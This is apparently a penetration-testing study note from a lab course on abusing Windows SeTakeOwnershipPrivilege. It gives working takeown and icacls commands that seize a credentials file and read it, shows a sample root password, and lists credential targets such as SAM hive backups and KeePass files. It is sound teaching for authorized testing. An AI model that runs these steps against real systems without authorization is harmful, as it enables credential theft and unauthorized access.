# SeTakeOwnershipPrivilege
[SeTakeOwnershipPrivilege](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/take-ownership-of-files-or-other-objects)

> [!info] What it grants 
> The ability to take ownership of any **securable object** — AD objects, NTFS files/folders, printers, registry keys, services, processes. Assigns `WRITE_OWNER` rights over the object, meaning the holder can change the owner field in the object's security descriptor.

> [!note] Who normally has it 
> Administrators get this by default. Rare on standard user accounts, but not uncommon on **service accounts** — e.g. one tasked with backup jobs / VSS snapshots. Such accounts are often also granted `SeBackupPrivilege`, `SeRestorePrivilege`, and `SeSecurityPrivilege` together, as a way to grant granular capability without handing out full local admin.

> [!tip] When this matters
>  Those other privileges alone could likely be used to escalate. But sometimes you specifically need to take ownership of a file because other methods are blocked or don't behave as expected. This is a bit of an edge case, but worth understanding — including the AD scenario where **you assign this right to a user you control** (e.g. via GPO abuse) specifically to read a sensitive file on a share.

### Where this is configured

Group Policy path:

```
Computer Configuration → Windows Settings → Security Settings → Local Policies → User Rights Assignment
```

Setting name: **Take ownership of files or other objects** — default assignment: Administrators. Microsoft's own policy description warns of security risk and advises assigning only to trusted users.

> [!danger] Impact 
> With this privilege, a user can take ownership of any file/object and modify it — potentially exposing sensitive data, enabling RCE, or causing a Denial-of-Service.

> [!tip] Real-world abuse path
>  If you find a user with this privilege — or assign it to a controlled user via an attack like GPO abuse (e.g. **SharpGPOAbuse**) — you can use it to take control of a shared folder or sensitive file (a document with passwords, an SSH key, etc.).

```powershell
PS C:\htb> whoami /priv

SeIncreaseWorkingSetPrivilege Increase a process working set                          Disabled
```

### Enabling SeTakeOwnershipPrivilege

> [!info] Disabled ≠ absent 
> The privilege is assigned but not enabled — We can enable it using this [script](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) which is detailed in [this](https://www.leeholmes.com/blog/2010/09/24/adjusting-token-privileges-in-powershell/) blog post, as well as [this](https://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77) one which builds on the initial concept.

```powershell
PS C:\htb> Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1
PS C:\htb> whoami /priv

PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                              State
============================= ======================================== =======
SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
```

### Choosing a Target File

> [!info] File shares are a rich target Common structure: `Public`/`Private` directories with department subfolders. Even with strict-looking permission structures, sysadmins often misconfigure specific directories/subdirectories — making shares a strong source of intel once you have AD credentials (sometimes even without them).
> 
> Example scenario: browsing a share, `Public` yields nothing interesting, but under `Private` you find you can **list** certain subdirectory contents even though reading most files gives Access Denied. A file `cred.txt` turns up under an `IT` subdirectory.

> [!danger] Handle with care Changing file ownership is a **potentially destructive** action — it can break an application or disrupt users depending on that object. Never change ownership of something like a live `web.config` without client consent first. Changing ownership several subdirectories deep (and adjusting permissions along the way) can be hard to fully revert — avoid if possible.

**Check the target file's current metadata:**

```powershell
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

FullName                                 LastWriteTime         Attributes Owner
--------                                 -------------         ---------- -----
C:\Department Shares\Private\IT\cred.txt 6/18/2021 12:23:28 PM    Archive
```

> [!note] Owner blank No owner shown = insufficient permissions to view that detail directly.

**Check the parent directory's owner instead:**

```powershell
PS C:\htb> cmd /c dir /q 'C:\Department Shares\Private\IT'

 Volume in drive C has no label.
 Volume Serial Number is 0C92-675B

 Directory of C:\Department Shares\Private\IT

06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  .
06/18/2021  12:22 PM    <DIR>          WINLPE-SRV01\sccm_svc  ..
06/18/2021  12:23 PM                36 ...                    cred.txt
```

The `IT` share is owned by a service account (`sccm_svc`), and contains `cred.txt`.

### Taking Ownership of the File
[takeown](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/takeown) Windows binary
```powershell
PS C:\htb> takeown /f 'C:\Department Shares\Private\IT\cred.txt'

SUCCESS: The file (or folder): "C:\Department Shares\Private\IT\cred.txt" now owned by user "WINLPE-SRV01\htb-student".
```

### Confirming Ownership Changed

```powershell
PS C:\htb> Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}

Name     Directory                       Owner
----     ---------                       -----
cred.txt C:\Department Shares\Private\IT WINLPE-SRV01\htb-student
```

### Modifying the File ACL

> [!warning] Ownership ≠ automatic read access Being the owner doesn't necessarily grant read rights yet — the ACL itself may still block you.

```powershell
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

cat : Access to the path 'C:\Department Shares\Private\IT\cred.txt' is denied.
At line:1 char:1
+ cat 'C:\Department Shares\Private\IT\cred.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Department Shares\Private\IT\cred.txt:String) [Get-Content], Unaut
   horizedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
```

**Grant yourself full rights via `icacls`:**

```powershell
PS C:\htb> icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F

processed file: C:\Department Shares\Private\IT\cred.txt
Successfully processed 1 files; Failed processing 0 files
```

### Reading the File

```powershell
PS C:\htb> cat 'C:\Department Shares\Private\IT\cred.txt'

NIX01 admin

root:n1X_p0wer_us3er!
```

> [!important] Cleanup and disclosure After leveraging this, make every effort to **revert permissions/ownership**. If reversion isn't possible, alert the client and document every modification carefully in a report appendix. This is a destructive-capable action — some clients may prefer you **document the ability** to perform it (evidence of the misconfiguration) without actually completing the takeover, given the potential impact.

## When to Use? — Files of Interest

Local files worth targeting with this technique:

```shellsession
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
```

> [!tip] Also watch for `.kdbx` KeePass database files, OneNote notebooks, `passwords.*`, `pass.*`, `creds.*`, scripts, other config files, virtual hard drive files, and similar — all good targets for sensitive-data extraction once ownership/read access is obtained.

## Key Takeaways

- [ ] `SeTakeOwnershipPrivilege` grants `WRITE_OWNER` rights — the ability to reassign ownership of any securable object
- [ ] Rare on standard users, more common on service accounts handling backups/VSS, often paired with `SeBackupPrivilege`/`SeRestorePrivilege`/`SeSecurityPrivilege`
- [ ] GPO path: Computer Configuration → Windows Settings → Security Settings → Local Policies → User Rights Assignment → "Take ownership of files or other objects"
- [ ] Workflow: enable the privilege (if disabled) → `takeown /f <path>` to become owner → `icacls <path> /grant <user>:F` to actually grant read/write access → read the file
- [ ] Taking ownership is a **destructive, hard-to-revert** action — get client consent, document everything, consider proving the capability without executing it fully on sensitive/live files
- [ ] This privilege can also be **assigned to a controlled account** via GPO abuse (e.g. SharpGPOAbuse) as an attack path, not just found pre-existing
- [ ] Strong target list: SAM/SECURITY hive backups, `web.config`, KeePass databases, anything named `pass*`/`cred*`, scripts, and other config files
